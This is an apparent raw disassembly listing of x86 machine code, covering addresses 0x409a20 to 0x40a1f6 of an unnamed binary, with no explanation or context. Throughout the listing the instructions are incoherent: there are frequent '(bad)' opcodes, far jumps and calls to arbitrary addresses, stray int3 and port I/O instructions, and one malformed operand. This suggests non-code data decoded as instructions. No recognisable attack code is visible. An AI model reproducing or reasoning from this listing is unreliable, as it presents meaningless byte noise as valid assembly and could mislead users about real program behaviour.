  409a20:	inc    DWORD PTR [esi+0x7800ff06]
  409a26:	add    bh,bh
  409a28:	jmp    FWORD PTR [ecx-0x3b]
  409a2b:	add    bh,bh
  409a2d:	lods   eax,DWORD PTR ds:[esi]
  409a2e:	lods   al,BYTE PTR ds:[esi]
  409a2f:	add    DWORD PTR [eax],0x7c
  409a32:	push   edx
  409a33:	add    BYTE PTR [ecx-0xfe4f],cl
  409a39:	mov    ds:0x1b83ffd2,eax
  409a3e:	push   edx
  409a3f:	int3   
  409a40:	mov    DWORD PTR [ebx+ebp*8-0x1],eax
  409a44:	(bad)  
  409a45:	jmp    0xffe7:0xbd83ff15
  409a4c:	int3   
  409a4d:	mov    bl,0x3e
  409a4f:	add    BYTE PTR [ecx-0x766348],cl
  409a55:	pop    ebp
  409a56:	cli    
  409a57:	add    bh,bh
  409a59:	mov    al,0x3a
  409a5b:	int3   
  409a5c:	add    BYTE PTR [edx],al
  409a5e:	and    bh,bh
  409a60:	call   DWORD PTR [esi+0x4100ffb2]
  409a66:	push   es
  409a67:	add    BYTE PTR [ebx-0x53d5],al
  409a6d:	(bad)  
  409a6e:	out    0x89,eax
  409a70:	add    BYTE PTR [eax-0x67],dh
  409a73:	add    BYTE PTR [eax],al
  409a75:	xor    al,0xab
  409a77:	cmp    edi,0x5f
  409a7a:	jno    0x4099ff
  409a7c:	call   FWORD PTR [eax+0x5c89ff53]
  409a82:	out    0xff,eax
  409a84:	jmp    DWORD PTR [eax+0x7bffff1a]
  409a8a:	sub    DWORD PTR [eax],eax
  409a8c:	push   esi
  409a8e:	out    dx,eax
  409a8f:	mov    DWORD PTR [eax],eax
  409a91:	(bad)  
  409a93:	add    BYTE PTR [eax],al
  409a95:	not    DWORD PTR [ebx+0x3621cc89]
  409a9b:	add    bh,bh
  409a9d:	js     0x409af9
  409a9f:	cmp    edi,0x6f
  409aa2:	clc    
  409aa3:	add    BYTE PTR [ebx-0x768b50],al
  409aa9:	in     al,dx
  409aaa:	dec    ebx
  409aab:	add    BYTE PTR [ecx-0x3300cd49],cl
  409ab1:	lea    ecx,[ecx+0x1260ff00]
  409ab7:	add    bh,bh
  409ab9:	data16 mov BYTE PTR [eax],al
  409abc:	int3   
  409abd:	lea    esi,[edx]
  409abf:	inc    DWORD PTR [eax]
  409ac1:	test   BYTE PTR [eax-0x1],0xcc
  409ac5:	mov    ebx,0x5ffff78
  409aca:	sbb    bh,bh
  409acc:	jmp    DWORD PTR [ecx+0x5d]
  409acf:	cmp    edi,0xffffffac
  409ad2:	dec    ecx
  409ad3:	int3   
  409ad4:	dec    DWORD PTR [eax]
  409ad6:	(bad)  
  409ad7:	int3   
  409ad8:	call   DWORD PTR [ecx]
  409ada:	mov    bh,bh
  409adc:	push   ecx
  409ade:	rol    DWORD PTR [eax],1
  409ae0:	push   DWORD PTR [ecx]
  409ae2:	cdq    
  409ae3:	inc    DWORD PTR [ebx+0x834102]
  409ae9:	cli    
  409aea:	push   eax
  409aeb:	(bad)  
  409aec:	call   FWORD PTR [esp+esi*8+0x2c9aff00]
  409af3:	inc    DWORD PTR [eax]
  409af5:	push   ebx
  409af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409af7:	(bad)  
  409af8:	call   DWORD PTR [eax-0x65]
  409afb:	int3   
  409afc:	xor    eax,0xffffffd9
  409aff:	add    DWORD PTR [ebx-0xdbab],0x21
  409b06:	adc    al,0xff
  409b08:	(bad)  
  409b09:	fld    QWORD PTR [ebx+eax*4]
  409b0c:	add    BYTE PTR [ebp+ecx*2+0x24f7ffff],ch
  409b13:	mov    edi,edi
  409b15:	out    0x63,eax
  409b17:	(bad)  
  409b18:	(bad)  
  409b19:	mov    edi,0x51000047
  409b1e:	cdq    
  409b1f:	inc    DWORD PTR [eax]
  409b21:	pusha  
  409b22:	loope  0x409b23
  409b24:	add    BYTE PTR [edi-0x33],dh
  409b27:	mov    edi,edi
  409b29:	fs cmp edi,edi
  409b2c:	jmp    FWORD PTR [ebx]
  409b2e:	(bad)  
  409b30:	add    BYTE PTR [eax-0x28],ah
  409b33:	add    BYTE PTR [ebx-0xff477b],al
  409b39:	(bad)  
  409b3a:	jne    0x409b3b
  409b3c:	add    cl,bl
  409b3e:	mov    edi,0xd205ff00
  409b43:	inc    DWORD PTR [ebx-0xff55a0]
  409b49:	clc    
  409b4a:	xor    al,0x83
  409b4c:	add    BYTE PTR [eax-0x2e],cl
  409b4f:	add    bh,bh
  409b51:	lahf   
  409b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b53:	(bad)  
  409b54:	dec    DWORD PTR [edi]
  409b56:	mov    ebx,0x50faff00
  409b5b:	inc    DWORD PTR [eax]
  409b5d:	xor    eax,0x4c89007a
  409b62:	jns    0x409b64
  409b64:	(bad)  
  409b65:	jnp    0x409b46
  409b67:	add    BYTE PTR [ebx-0x33bdfc],al
  409b6d:	(bad)  
  409b6e:	mov    eax,0x5bbc0000
  409b73:	int3   
  409b74:	int3   
  409b75:	inc    eax
  409b76:	xchg   edx,eax
  409b77:	dec    esp
  409b79:	in     al,dx
  409b7a:	mov    DWORD PTR ss:[eax],eax
  409b7d:	jp     0x409b88
  409b7f:	inc    DWORD PTR [ebx-0x33f029]
  409b85:	mov    ebp,0x18000044
  409b8a:	mov    ecx,0x9740000
  409b8f:	add    BYTE PTR [ecx-0x335b5b],cl
  409b95:	adc    eax,0x7900ffcc
  409b9a:	out    dx,al
  409b9b:	cmp    edi,0xffffffbe
  409b9e:	stos   BYTE PTR es:[edi],al
  409b9f:	inc    DWORD PTR [ebx-0xda25]
  409ba5:	ja     0x409b82
  409ba7:	(bad)  
  409ba8:	inc    DWORD PTR [ebx-0x6b]
  409bab:	add    BYTE PTR [ebx+0xff0bfc],al
  409bb1:	test   DWORD PTR [eax-0x7d],ecx
  409bb4:	inc    DWORD PTR [eax-0x6e]
  409bb7:	(bad)  
  409bb8:	(bad)  
  409bb9:	jle    0x409bbb
  409bbb:	cmp    edi,0xffffffd9
  409bbe:	xor    eax,DWORD PTR [eax]
  409bc0:	add    BYTE PTR [edi+0x583cc81],ah
  409bc6:	cmp    bh,bh
  409bc8:	xor    esp,0x4d
  409bcb:	(bad)  
  409bcc:	jmp    FWORD PTR [edi-0x2a0000b7]
  409bd2:	xchg   edi,eax
  409bd3:	int3   
  409bd4:	jmp    FWORD PTR [edx-0x3fffffd1]
  409bda:	push   ss
  409bdb:	add    DWORD PTR [ebx-0x2b70],0x55
  409be2:	dec    ah
  409be4:	jmp    DWORD PTR ds:0xdbff00f9
  409bea:	add    BYTE PTR ss:[eax],al
  409bed:	ror    edi,0xff
  409bf0:	jmp    FWORD PTR [esi]
  409bf2:	fild   DWORD PTR [eax]
  409bf4:	(bad)  
  409bf5:	mov    ecx,0x85008904
  409bfa:	repz mov edi,edi
  409bfd:	adc    ebx,DWORD PTR [eax]
  409bff:	int3   
  409c00:	jmp    DWORD PTR [edi-0x67]
  409c03:	inc    DWORD PTR [eax]
  409c05:	mov    esp,0xa4ffcc22
  409c0a:	fdivr  st,st(7)
  409c0c:	cmp    DWORD PTR [ebx-0x3e00000e],0x67
  409c13:	add    bh,bh
  409c15:	xor    eax,0x6e00ff06
  409c1a:	cmp    bh,0xff
  409c1d:	sahf   
  409c1e:	mov    eax,DWORD PTR [eax]
  409c20:	add    BYTE PTR [edx-0x25],al
  409c23:	int3   
  409c24:	and    DWORD PTR [edx+0x5dffcc4e],0xffffffd5
  409c2b:	int3   
  409c2c:	and    DWORD PTR ds:0x1c00ff8b,0x8
  409c33:	inc    DWORD PTR [eax]
  409c35:	aam    0x50
  409c37:	dec    esp
  409c39:	das    
  409c3a:	test   DWORD PTR [ebx+0x17abff],0x83aed4ff
  409c44:	add    BYTE PTR [edx-0x57],bl
  409c47:	inc    DWORD PTR [ebx-0xff8b5e]
  409c4d:	out    0x4b,al
  409c4f:	add    bh,bh
  409c51:	stc    
  409c52:	ds or  esp,0xfffffff1
  409c56:	(bad)  
  409c58:	add    BYTE PTR [edx-0x3a337c87],dh
  409c5e:	xchg   ebx,eax
  409c5f:	(bad)  
  409c60:	jmp    FWORD PTR ds:0x2c008319
  409c66:	xchg   esi,eax
  409c67:	cmp    edi,0xffffffa5
  409c6a:	ret    0x89ff
  409c6d:	(bad)  
  409c6e:	je     0x409c6f
  409c70:	int3   
  409c71:	sbb    al,cl
  409c73:	add    bh,bh
  409c75:	jne    0x409cc3
  409c77:	add    bh,bh
  409c79:	jge    0x409ccc
  409c7b:	inc    DWORD PTR [eax]
  409c7d:	sbb    BYTE PTR [eax+0x51dd8300],al
  409c83:	add    bh,bh
  409c85:	(bad)  
  409c86:	jp     0x409c87
  409c88:	int3   
  409c89:	je     0x409c77
  409c8b:	inc    DWORD PTR [eax]
  409c8d:	jne    0x409cd6
  409c8f:	inc    DWORD PTR [eax]
  409c91:	xchg   edx,eax
  409c92:	aas    
  409c93:	add    BYTE PTR [eax],al
  409c95:	xchg   DWORD PTR [edi],ebx
  409c97:	(bad)  
  409c98:	call   ecx
  409c9a:	pop    edi
  409c9b:	cmp    edi,0xffffffdd
  409c9e:	dec    BYTE PTR [ecx+0x6f4cff]
  409ca4:	call   FWORD PTR [ebx+edx*8-0x34]
  409ca8:	add    al,ah
  409caa:	clc    
  409cab:	(bad)  
  409cac:	jmp    eax
  409cae:	nop
  409caf:	add    BYTE PTR [ebx-0x7633f21a],al
  409cb5:	je     0x409d0f
  409cb7:	inc    DWORD PTR [eax]
  409cb9:	xor    al,0xf2
  409cbb:	(bad)  
  409cbc:	inc    DWORD PTR [ebp-0x71]
  409cbf:	inc    DWORD PTR [ebx-0xffb7ea]
  409cc5:	stos   DWORD PTR es:[edi],eax
  409cc6:	ret    
  409cc7:	inc    DWORD PTR [eax]
  409cc9:	jbe    0x409c4e
  409ccb:	or     esp,0xffffffa9
  409cce:	jge    0x409ccf
  409cd0:	xor    DWORD PTR [esi+0x4b],0xffffff83
  409cd4:	add    cl,ch
  409cd6:	dec    esi
  409cd7:	mov    DWORD PTR [ebx+0xffd128],eax
  409cdd:	(bad)  
  409cdf:	int3   
  409ce0:	add    BYTE PTR [eax-0x407cff97],dl
  409ce6:	stc    
  409ce7:	(bad)  
  409ce8:	call   FWORD PTR [esi+0x2500833d]
  409cee:	add    BYTE PTR fs:[eax],al
  409cf1:	push   edx
  409cf2:	jg     0x409cf3
  409cf4:	add    BYTE PTR [eax],dl
  409cf6:	jns    0x409cf8
  409cf8:	jmp    esi
  409cfa:	adc    al,0xff
  409cfc:	(bad)  
  409cfd:	ds inc eax
  409cff:	int3   
  409d00:	add    BYTE PTR [ebx+0x79],bl
  409d03:	cmp    edi,0x10
  409d06:	test   bh,bh
  409d08:	inc    DWORD PTR [eax]
  409d0a:	cmp    bh,bh
  409d0c:	call   FWORD PTR [eax+0x2]
  409d0f:	inc    DWORD PTR [eax]
  409d11:	inc    ebp
  409d12:	mov    edi,0x1a5689ff
  409d17:	or     DWORD PTR [ecx+0xc426],0x18
  409d1e:	(bad)  
  409d1f:	dec    DWORD PTR [ecx+0xccdf46]
  409d25:	cwde   
  409d26:	xchg   edx,eax
  409d27:	add    bh,bh
  409d29:	and    al,0x5c
  409d2b:	cmp    edi,0xffffffc7
  409d2e:	or     BYTE PTR [eax],al
  409d30:	(bad)  
  409d31:	cmp    bl,dl
  409d33:	add    BYTE PTR [ecx-0x33f019],cl
  409d39:	jnp    0x409cdc
  409d3b:	(bad)  
  409d3c:	call   edi
  409d3e:	mov    BYTE PTR [eax],al
  409d40:	(bad)  
  409d41:	cmp    BYTE PTR [esi-0x7dbbff01],bh
  409d47:	cmp    edi,0x43
  409d4a:	cdq    
  409d4b:	cmp    edi,0xffffff91
  409d4e:	adc    al,BYTE PTR [eax]
  409d50:	cmp    DWORD PTR [eax-0x12],0xffffffcc
  409d54:	add    BYTE PTR [ebx+edi*4-0x3c0a0000],ah
  409d5b:	inc    DWORD PTR [eax]
  409d5d:	into   
  409d5e:	jl     0x409d60
  409d60:	call   DWORD PTR [ebx]
  409d62:	(bad)  
  409d64:	add    al,cl
  409d66:	test   BYTE PTR [eax],0xff
  409d69:	lods   al,BYTE PTR ds:[esi]
  409d6a:	xor    eax,0xb738ffcc
  409d6f:	add    bh,bh
  409d71:	stos   DWORD PTR es:[edi],eax
  409d72:	cmp    esp,ecx
  409d74:	dec    DWORD PTR [eax+0x6700ff30]
  409d7a:	jb     0x409d7c
  409d7c:	(bad)  
  409d7d:	mov    esi,0x1983ff01
  409d82:	add    al,0xff
  409d84:	add    BYTE PTR [ebp+0x56],cl
  409d87:	inc    DWORD PTR [eax]
  409d89:	in     eax,dx
  409d8a:	popf   
  409d8b:	add    bh,bh
  409d8d:	lock pop ds
  409d8f:	or     esp,0x4d
  409d92:	sub    al,0xff
  409d94:	add    BYTE PTR [ebx],bl
  409d96:	lods   al,BYTE PTR ds:[esi]
  409d97:	mov    DWORD PTR [ebx-0xec53],eax
  409d9d:	jnp    0x409d8b
  409d9f:	add    BYTE PTR [eax],al
  409da1:	cmc    
  409da2:	mov    ebx,0xcd3783ff
  409da7:	add    BYTE PTR [ebx+0x833d33],al
  409dad:	add    al,0x4b
  409daf:	add    bh,bh
  409db1:	mov    DWORD PTR [edi+edi*8-0x7cd434],edi
  409db8:	mov    DWORD PTR [eax],edi
  409dba:	inc    DWORD PTR ss:[ebx+0xccc6f8]
  409dc1:	sub    edx,eax
  409dc3:	(bad)  
  409dc4:	push   DWORD PTR [eax-0x52]
  409dc7:	mov    DWORD PTR [ecx-0x72fd],ecx
  409dcd:	xchg   BYTE PTR [eax],ch
  409dcf:	add    BYTE PTR [eax],al
  409dd1:	mov    DWORD PTR [esi-0x49100001],edi
  409dd7:	mov    DWORD PTR [eax],eax
  409dd9:	xchg   esi,eax
  409dda:	outs   dx,DWORD PTR ds:[esi]
  409ddb:	add    BYTE PTR [eax],al
  409ddd:	or     BYTE PTR [ebx-0x1],ch
  409de0:	add    BYTE PTR [esi],dl
  409de2:	adc    eax,0xd460ccff
  409de7:	add    BYTE PTR [eax],al
  409de9:	pop    ebp
  409dea:	loope  0x409deb
  409dec:	add    BYTE PTR [esi-0x2b7cff5a],bh
  409df2:	or     al,0x89
  409df4:	add    BYTE PTR [ecx],ch
  409df6:	std    
  409df7:	cmp    edi,0x36
  409dfa:	popf   
  409dfb:	(bad)  
  409dfc:	call   DWORD PTR [ecx]
  409dfe:	loope  0x409e00
  409e00:	add    BYTE PTR [edx],bh
  409e02:	or     bh,bh
  409e04:	call   DWORD PTR [eax]
  409e06:	xchg   esi,eax
  409e07:	(bad)  
  409e08:	(bad)  
  409e09:	jp     0x409dc5
  409e0b:	inc    DWORD PTR [eax]
  409e0d:	je     0x409de6
  409e0f:	inc    DWORD PTR [ebx-0x7c8f01]
  409e15:	pop    ebx
  409e16:	dec    ebp
  409e17:	inc    DWORD PTR [ebx+0xfff44e]
  409e1d:	iret   
  409e1e:	sub    cl,ah
  409e20:	jmp    DWORD PTR [ecx-0x1e]
  409e23:	add    BYTE PTR [eax],al
  409e25:	mul    DWORD PTR [edi+edi*8-0x1]
  409e29:	xor    eax,0x66cc00cf
  409e2e:	aam    0xff
  409e30:	inc    DWORD PTR [ecx-0x2900ff74]
  409e36:	stc    
  409e37:	inc    DWORD PTR [eax]
  409e39:	and    bl,bh
  409e3b:	dec    esp
  409e3d:	inc    ebp
  409e3e:	sbb    al,0xff
  409e40:	or     ecx,0x1a
  409e43:	(bad)  
  409e44:	jmp    FWORD PTR [ebx-0x37]
  409e47:	(bad)  
  409e48:	inc    DWORD PTR [ebx+0x6700ff9e]
  409e4e:	ret    
  409e4f:	inc    DWORD PTR [eax]
  409e51:	ins    BYTE PTR es:[edi],dx
  409e52:	or     eax,0x441f0000
  409e57:	inc    DWORD PTR [ebx-0x33423e]
  409e5d:	repz add BYTE PTR [ebx-0x3325e601],0x0
  409e65:	mov    edi,0x78ff83f1
  409e6a:	mov    edi,edi
  409e6c:	add    al,ch
  409e6e:	fild   DWORD PTR [eax]
  409e70:	mov    DWORD PTR [esi],esp
  409e72:	push   edx
  409e73:	dec    DWORD PTR [ecx-0xff1450]
  409e79:	test   BYTE PTR [ecx],0xff
  409e7c:	push   DWORD PTR ds:0x52ff83fc
  409e82:	test   BYTE PTR [eax],0xff
  409e85:	push   ebp
  409e86:	pop    esp
  409e87:	cmp    edi,0x7f
  409e8a:	jmp    0x409e0f
  409e8c:	mov    DWORD PTR [ebx],esi
  409e8e:	push   0xffffffff
  409e90:	add    BYTE PTR [ebp+0x3dffff1e],bh
  409e96:	mov    ?,edi
  409e98:	int3   
  409e99:	jle    0x409eba
  409e9b:	add    BYTE PTR [ebx-0x76002afa],al
  409ea1:	bnd jns 0x409ea3
  409ea4:	jmp    FWORD PTR [eax-0x70]
  409ea7:	(bad)  
  409ea8:	jmp    FWORD PTR [esi-0x3fff7c10]
  409eae:	mov    edi,0xe352ffff
  409eb3:	add    DWORD PTR [eax],0x10
  409eb6:	xor    bh,bh
  409eb8:	dec    DWORD PTR [edx]
  409eba:	pop    ebp
  409ebb:	int3   
  409ebc:	call   FWORD PTR [ebp+0x4]
  409ebf:	(bad)  
  409ec0:	call   edi
  409ec2:	xchg   esi,eax
  409ec3:	(bad)  
  409ec4:	call   DWORD PTR [esi+eiz*2-0x62763400]
  409ecb:	add    bh,bh
  409ecd:	sbb    bh,BYTE PTR [esi-0x1]
  409ed0:	add    bl,dh
  409ed2:	pop    ebp
  409ed3:	add    ah,cl
  409ed5:	ins    DWORD PTR es:[edi],dx
  409ed6:	fild   DWORD PTR [ebx+0x1ae500]
  409edc:	add    BYTE PTR [edi+0x19ccff39],ch
  409ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ee3:	(bad)  
  409ee4:	(bad)  
  409ee5:	fcomp  DWORD PTR [edi]
  409ee7:	or     esp,0xffffffb0
  409eea:	in     al,0xff
  409eec:	add    BYTE PTR [esi-0x11],ch
  409eef:	inc    DWORD PTR [eax]
  409ef1:	pusha  
  409ef2:	adc    eax,0xb876ff89
  409ef7:	inc    DWORD PTR [ebx-0xbe7e]
  409efd:	imul   esi,DWORD PTR [esp+ecx*8],0xff738200
  409f04:	add    BYTE PTR ds:0xe4ffff9d,ah
  409f0a:	jne    0x409f0b
  409f0c:	mov    ebp,eax
  409f0e:	rol    DWORD PTR [ebx-0x45fc01],cl
  409f14:	push   DWORD PTR [ebx+eax*4-0x1]
  409f18:	call   DWORD PTR ds:0x57830042
  409f1e:	xlat   BYTE PTR ds:[ebx]
  409f1f:	add    bh,bh
  409f21:	cs pop edi
  409f23:	(bad)  
  409f24:	(bad)  
  409f25:	inc    BYTE PTR [ebx+eax*4-0x95d97d]
  409f2c:	mov    DWORD PTR [eax+edx*1-0x1],ebx
  409f30:	inc    DWORD PTR [ebp+0x2ffffffd]
  409f36:	or     bh,bh
  409f38:	add    BYTE PTR [esp+edx*2+0x0],bl
  409f3c:	add    dl,cl
  409f3e:	clc    
  409f3f:	add    BYTE PTR [eax],al
  409f41:	test   BYTE PTR [ecx-0x1],cl
  409f44:	int3   
  409f45:	cmp    al,0xfd
  409f47:	(bad)  
  409f48:	inc    DWORD PTR [eax+0x6c8300ee]
  409f4e:	sub    BYTE PTR [eax],al
  409f50:	int3   
  409f51:	pop    ecx
  409f52:	popf   
  409f53:	inc    DWORD PTR [eax]
  409f55:	xor    esi,0x98e9ffff
  409f5b:	add    ah,cl
  409f5d:	jbe    0x409f91
  409f5f:	(bad)  
  409f60:	(bad)  
  409f61:	fistp  DWORD PTR [eax-0xa3007d]
  409f67:	add    bh,bh
  409f69:	lock rol BYTE PTR [eax],cl
  409f6c:	jmp    FWORD PTR [ecx+0x13ffcc5b]
  409f72:	ins    DWORD PTR es:[edi],dx
  409f73:	inc    DWORD PTR [eax]
  409f75:	xchg   ecx,eax
  409f76:	fadd   QWORD PTR [eax]
  409f78:	jmp    ebp
  409f7a:	inc    esp
  409f7b:	mov    edi,edi
  409f7d:	xor    DWORD PTR [edi+edi*8],ebx
  409f80:	call   DWORD PTR [ebp+0x4f]
  409f83:	add    BYTE PTR [ecx+0x92b1],cl
  409f89:	pop    ss
  409f8a:	push   eax
  409f8b:	inc    DWORD PTR [ebx-0xfffa74]
  409f91:	xor    eax,0xf898956
  409f96:	rol    BYTE PTR [eax],cl
  409f98:	sub    DWORD PTR [edi-0x58],0xffffffff
  409f9c:	xor    DWORD PTR ds:0xd0ffff80,0xffffffb4
  409fa3:	(bad)  
  409fa4:	call   DWORD PTR [esi+0x37]
  409fa7:	int3   
  409fa8:	(bad)  
  409fa9:	out    dx,eax
  409faa:	dec    eax
  409fab:	mov    DWORD PTR [eax],eax
  409fad:	arpl   ax,bx
  409faf:	add    BYTE PTR [eax],al
  409fb1:	test   eax,0xf2ff83b0
  409fb6:	xchg   BYTE PTR [eax],al
  409fb8:	add    bl,bh
  409fba:	std    
  409fbb:	(bad)  
  409fbc:	push   DWORD PTR ds:0xdc000011
  409fc2:	test   eax,0xaf2000ff
  409fc7:	add    BYTE PTR [eax],al
  409fc9:	and    DWORD PTR [esi],ecx
  409fcb:	add    BYTE PTR [eax],al
  409fcd:	aam    0xe6
  409fcf:	add    bh,bh
  409fd1:	fimul  WORD PTR [edx-0x1]
  409fd4:	mov    edi,edi
  409fd6:	jmp    0x409f5b
  409fd8:	add    BYTE PTR [ebx+0x1],ah
  409fdb:	cmp    edi,0xc
  409fde:	adc    edi,edi
  409fe0:	int3   
  409fe1:	retf   
  409fe2:	mov    eax,ds:0x587000ff
  409fe7:	(bad)  
  409fe8:	inc    DWORD PTR [edi-0x6b3300ca]
  409fee:	push   esi
  409fef:	(bad)  
  409ff0:	dec    edx
  409ff2:	xor    al,0xcc
  409ff4:	add    BYTE PTR [edx-0x30003381],ah
  409ffa:	mov    cl,0xff
  409ffc:	call   DWORD PTR [edx-0x3c3300c4]
  40a002:	dec    ebx
  40a003:	(bad)  
  40a004:	(bad)  
  40a005:	out    dx,al
  40a006:	inc    DWORD PTR es:[eax]
  40a009:	shl    BYTE PTR [edx],1
  40a00b:	inc    DWORD PTR [ebx-0x7c16a8]
  40a011:	cli    
  40a012:	mov    bh,bh
  40a014:	jmp    edi
  40a016:	repnz inc DWORD PTR [eax]
  40a019:	mov    ds:0x780083c3,eax
  40a01e:	dec    ebx
  40a01f:	add    bh,bh
  40a021:	(bad)  
  40a022:	popf   
  40a023:	(bad)  
  40a024:	inc    DWORD PTR [edi+eax*2+0x1c14ffff]
  40a02b:	inc    DWORD PTR [eax]
  40a02d:	mov    ebp,0xcc000082
  40a032:	jnp    0x40a033
  40a034:	int3   
  40a035:	add    BYTE PTR [eax+0x0],dh
  40a038:	call   FWORD PTR [edi*4+0xe86ffff]
  40a03f:	add    bh,bh
  40a041:	xchg   edi,eax
  40a042:	inc    ecx
  40a043:	add    bh,bh
  40a045:	mov    esi,0xe283cc4f
  40a04a:	cmp    al,0x0
  40a04c:	add    BYTE PTR [ebp+0x7e0000d4],bh
  40a052:	ins    BYTE PTR es:[edi],dx
  40a053:	dec    esp
  40a055:	mov    bh,0x8a
  40a057:	inc    DWORD PTR [eax]
  40a059:	out    dx,eax
  40a05a:	sub    eax,0xd45e00ff
  40a05f:	inc    DWORD PTR [ebx-0x33009e68]
  40a065:	dec    edi
  40a066:	pusha  
  40a067:	(bad)  
  40a068:	jmp    DWORD PTR [edi+0x33]
  40a06b:	add    BYTE PTR [ebx-0x38cc],al
  40a071:	fs sbb bh,bh
  40a074:	dec    DWORD PTR [esi+0x52]
  40a077:	(bad)  
  40a078:	inc    DWORD PTR [esi+0x37]
  40a07b:	inc    DWORD PTR [eax]
  40a07d:	rol    DWORD PTR [ebp-0x6da1007d],0x83
  40a084:	jmp    DWORD PTR ds:0x4f89ff00
  40a08a:	inc    edx
  40a08b:	add    BYTE PTR [eax],al
  40a08d:	xor    BYTE PTR ds:0x7968ff83,cl
  40a093:	add    bh,bh
  40a095:	xor    eax,0x9c00ffa3
  40a09a:	fadd   QWORD PTR [eax]
  40a09c:	call   DWORD PTR [ebx]
  40a09e:	pop    esi
  40a09f:	add    bh,bh
  40a0a1:	out    0x77,al
  40a0a3:	inc    DWORD PTR [ebx-0x62b]
  40a0a9:	dec    edi
  40a0aa:	add    DWORD PTR [ebx-0x7c31cc00],0xff7c1a83
  40a0b4:	xor    DWORD PTR [ecx],0x1e
  40a0b7:	add    BYTE PTR [eax],al
  40a0b9:	ins    BYTE PTR es:[edi],dx
  40a0ba:	mov    dh,0x0
  40a0bc:	push   DWORD PTR [ebx]
  40a0be:	xor    al,BYTE PTR [ebx-0x2cee7d]
  40a0c4:	add    BYTE PTR [ecx+0x1affff30],dl
  40a0ca:	fdiv   st(7),st
  40a0cc:	inc    DWORD PTR [ebp-0x6cff33ed]
  40a0d2:	pop    DWORD PTR [eax]
  40a0d4:	(bad)  
  40a0d5:	in     al,dx
  40a0d6:	dec    edi
  40a0d7:	(bad)  
  40a0d8:	call   edi
  40a0da:	xchg   DWORD PTR [eax],eax
  40a0dc:	cmp    DWORD PTR [esi+0x660083b2],0xffffffe2
  40a0e3:	inc    DWORD PTR [eax]
  40a0e5:	mov    edx,0x99ff00ed
  40a0ea:	leave  
  40a0eb:	(bad)  
  40a0ec:	push   DWORD PTR [ebp+ebp*4+0x760c83ff]
  40a0f3:	(bad)  
  40a0f4:	call   DWORD PTR [esi]
  40a0f6:	xchg   ecx,eax
  40a0f7:	(bad)  
  40a0f8:	jmp    DWORD PTR [edi]
  40a0fa:	sub    esp,ecx
  40a0fc:	add    dl,ah
  40a0fe:	pop    ds
  40a0ff:	add    bh,bh
  40a101:	pop    esp
  40a102:	popa   
  40a103:	(bad)  
  40a104:	(bad)  
  40a105:	dec    edx
  40a107:	add    bh,bh
  40a109:	fnstsw WORD PTR [edx+0x0]
  40a10c:	add    BYTE PTR [ebp+esi*4+0x59c5cc00],dl
  40a113:	inc    DWORD PTR [eax]
  40a115:	push   edi
  40a116:	sub    eax,0xc9c5ccff
  40a11b:	add    bh,bh
  40a11d:	and    esi,DWORD PTR [edi]
  40a11f:	int3   
  40a120:	add    BYTE PTR [ebx-0x22],al
  40a123:	(bad)  
  40a124:	jmp    edi
  40a126:	rol    BYTE PTR [eax],1
  40a128:	jmp    DWORD PTR [ebp+0x6]
  40a12b:	inc    DWORD PTR [eax]
  40a12d:	or     ebx,DWORD PTR [ebx]
  40a12f:	add    bh,bh
  40a131:	ins    DWORD PTR es:[edi],dx
  40a132:	xor    al,0x0
  40a134:	add    dh,cl
  40a136:	pop    es
  40a137:	int3   
  40a138:	mov    DWORD PTR [esi],edi
  40a13a:	xor    eax,0x2860ffff
  40a13f:	(bad)  
  40a140:	(bad)  
  40a141:	jl     0x40a19a
  40a143:	(bad)  
  40a144:	(bad)  
  40a145:	cmp    DWORD PTR [ecx+0x0],edi
  40a148:	dec    DWORD PTR [ecx+eiz*4]
  40a14b:	add    BYTE PTR [eax],al
  40a14d:	fwait
  40a14e:	push   esi
  40a14f:	dec    esp
  40a151:	xor    BYTE PTR [edx-0x34],cl
  40a154:	add    ah,al
  40a156:	sub    BYTE PTR [eax],al
  40a158:	add    al,bh
  40a15a:	mov    ebp,0xe5370089
  40a15f:	add    DWORD PTR [eax],0xffffffe9
  40a162:	mov    edx,0x613f8983
  40a167:	inc    DWORD PTR [eax]
  40a169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a16a:	push   edx
  40a16b:	int3   
  40a16c:	mov    DWORD PTR [ebx+ecx*4],ecx
  40a16f:	add    BYTE PTR [eax],al
  40a171:	mov    esi,0x18ff8366
  40a176:	mov    al,ds:0x4269ff00
  40a17b:	add    BYTE PTR [eax],al
  40a17d:	adc    bl,dl
  40a17f:	add    DWORD PTR [eax],0x50
  40a182:	stc    
  40a183:	int3   
  40a184:	add    cl,ah
  40a186:	adc    bh,bh
  40a188:	(bad)  
  40a189:	in     eax,dx
  40a18a:	xlat   BYTE PTR ds:[ebx]
  40a18b:	add    bh,bh
  40a18d:	cmp    DWORD PTR [ebp-0x1],0xffffffff
  40a191:	or     ebx,DWORD PTR [edx]
  40a193:	cmp    edi,0xffffff95
  40a196:	mov    eax,ds:0xbecd8300
  40a19b:	inc    DWORD PTR [eax]
  40a19d:	out    dx,eax
  40a19e:	sti    
  40a19f:	(bad)  
  40a1a0:	inc    DWORD PTR [ebp-0x6c000080]
  40a1a6:	bound  ecx,QWORD PTR [ecx+0xb69100]
  40a1ac:	call   ecx
  40a1ae:	outs   dx,BYTE PTR ds:[esi]
  40a1af:	mov    DWORD PTR [eax],eax
  40a1b1:	sbb    al,BYTE PTR [esi-0x7d]
  40a1b4:	(bad)  
  40a1b5:	mov    esi,0xdb830059
  40a1ba:	inc    DWORD PTR ds:[eax]
  40a1bd:	outs   dx,DWORD PTR ds:[esi]
  40a1be:	fwait
  40a1bf:	cmp    edi,0x42
  40a1c2:	dec    ebp
  40a1c3:	int3   
  40a1c4:	jmp    DWORD PTR [edi-0x137cff3f]
  40a1ca:	mov    edi,edi
  40a1cc:	mov    DWORD PTR [eax-0x23],ebx
  40a1cf:	(bad)  
  40a1d0:	call   edx
  40a1d2:	mov    DWORD PTR [ebx+0xadbf83],0xff977a83
  40a1dc:	dec    DWORD PTR [ebx+eax*1-0x37893301]
  40a1e3:	add    BYTE PTR [eax],al
  40a1e5:	sbb    esi,DWORD PTR [ebx+0x0]
  40a1e8:	(bad)  
  40a1e9:	jns    0x40a211
  40a1eb:	add    bh,bh
  40a1ed:	adc    ecx,DWORD PTR [edi]
  40a1ef:	add    ah,cl
  40a1f1:	addr16 loop 0x40a1f4
  40a1f4:	call   FWORD PTR [ecx]
  40a1f6:	dec    eax
